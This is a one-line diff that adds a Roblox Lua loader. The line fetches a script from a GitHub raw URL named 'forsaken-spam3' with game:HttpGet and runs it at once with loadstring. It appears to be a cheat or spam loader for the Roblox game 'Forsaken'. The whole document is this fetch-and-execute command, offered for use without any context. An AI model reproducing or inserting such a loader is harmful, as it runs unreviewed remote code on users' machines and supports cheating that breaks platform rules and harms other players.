@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ForestBaseDuel/loaders/main/loaders/forsaken-spam3-7p1s1ifqo2zg0i.lua"))()
